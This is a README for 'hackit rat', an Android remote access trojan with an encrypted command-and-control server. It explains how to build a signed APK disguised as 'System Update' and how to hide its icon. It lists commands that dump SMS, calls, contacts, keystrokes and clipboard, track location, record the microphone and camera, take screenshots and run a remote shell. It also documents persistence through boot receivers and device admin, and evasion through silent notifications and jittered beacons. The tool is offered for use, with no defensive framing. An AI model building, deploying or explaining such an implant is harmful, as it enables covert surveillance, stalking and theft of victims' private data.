# hackit rat — Android implant + encrypted C2

Resident Android agent with a sealed command channel, a Python C2 and an
operator console. Build output is a signed APK; runtime support runs from
API 21 (Android 5.0) to API 35 (Android 15).

## Shape

```
implant (APK)  ──HTTPS POST /v1/beacon──▶  C2 (aiohttp)
   │  sealed envelope: AES-256-GCM + HMAC-SHA256, HKDF from a 32-byte PSK
   │  poll → tasks, results → next beacon
   ├─ collectors: sms, calls, contacts, location, notifications, keylog,
   │              clipboard, files, mic, camera, screen, apps, wifi, accounts
   └─ persistence: foreground service, boot receiver, alarm + job, device admin
```

Everything that crosses the wire is encrypted; no op name, task or artifact is
readable in transit. The PSK never leaves the build config and the C2 host.

## Quick start

```bash
hackit rat doctor                                     # JDK 17 + SDK + build-tools
hackit rat keygen --host https://c2.example.com       # PSK + agent.json
hackit rat build --config ~/.hackit/rat/agent.json    # signed APK
hackit rat console                                    # C2 + operator shell
```

`firewall + reverse proxy` (nginx/caddy) in front of the C2 is the expected
deployment; keep `/v1/*` open and `/api/*` behind the operator token.

Install on the device, open the app once (it is labelled "System Update"),
grant permissions, then enable accessibility and the notification listener
from the setup page. The launcher entry can then be switched off with:

```bash
hackit rat send <sid> hide_icon on
```

## Commands

| verb | args | effect |
|---|---|---|
| `info` | — | build, network, storage, security posture |
| `perm_status` | — | every permission the implant cares about |
| `sms_dump` / `sms_send` | `[n]` / `to body` | read, send SMS |
| `calls_dump` / `contacts_dump` | `[n]` | call log, contacts |
| `loc` / `loc_track` | — / `off` | one fix, continuous tracking |
| `files_ls` / `files_pull` / `files_push` | `path` | browse and move files |
| `clipboard_get` / `clipboard_set` | — / `text` | clipboard |
| `notif_dump` | — | notification listener state |
| `apps` | — | installed package census |
| `mic_rec` | `[seconds]` | AAC clip, uploaded |
| `cam_shot` / `screenshot` | — | JPEG still, PNG screen |
| `shell` | `command` | `/system/bin/sh`, 30 s, 512 KB cap |
| `keylog_dump` / `keylog_clear` | — | accessibility buffer |
| `wifi_dump` / `accounts` | — | association + scans, account names |
| `toast` / `vibrate` / `open_url` | `text` / `ms` / `url` | visible nudges |
| `hide_icon` | `on` / `off` | launcher alias |

`screenshot` needs a MediaProjection consent — open the setup page once and
tap *Screen capture consent*; consent is per-projection on Android 14+.

## Version behaviour

| area | 5–9 | 10–12 | 13–15 |
|---|---|---|---|
| permissions | install-time | runtime dialog | runtime dialog, notification prompt on 13+ |
| foreground service | plain start | `dataSync` type required on 14+ | types only while-in-use unless background location granted |
| clipboard | readable in background | foreground/IME only | same as 10 |
| screenshot | MediaProjection | MediaProjection | consent per capture, FGS `mediaProjection` type |
| boot start | works | works | works, battery optimisation exemption advised |
| SMS | read via permission | same | same (default-SMS role not required) |

The service asks for `location` only when background location is granted (or
the app is focused), and adds `microphone`/`camera` only when focused — which
is what Android 14+ demands and what keeps the start from throwing.

## Layout

```
hackit/rat/
  protocol.py     envelope, HKDF, command table (mirrored in Crypto.java)
  store.py        SQLite: sessions, tasks, events, keylogs, locations, loot
  server.py       beacon, upload, dashboard, operator API
  builder.py      config bake + sdk/gradle build engines
  console.py      operator REPL (in-process C2)
  template/       Android project (Java 8, min 21, target 35)
```

## Build engines

* `sdk` — aapt2 → javac → d8 → zipalign → apksigner, offline, no Gradle.
* `gradle` — AGP + R8 shrinking when Gradle is installed.

`doctor` reports exactly which piece is missing; `--engine` forces one.

## Design notes

* Tasks are handed out atomically (`state='delivered'`) so a duplicated beacon
  never double-runs them; unanswered tasks requeue after 180 s.
* Outbox queues are capped (2000 events, 256 results) — old items drop before
  RAM does.
* Every collector fails closed: a missing permission yields an empty result,
  never a crash.
* Order-0 notification channel, `IMPORTANCE_MIN`, no badge, no sound.
* Jittered beacon (±30% default) with exponential backoff to 5 minutes.
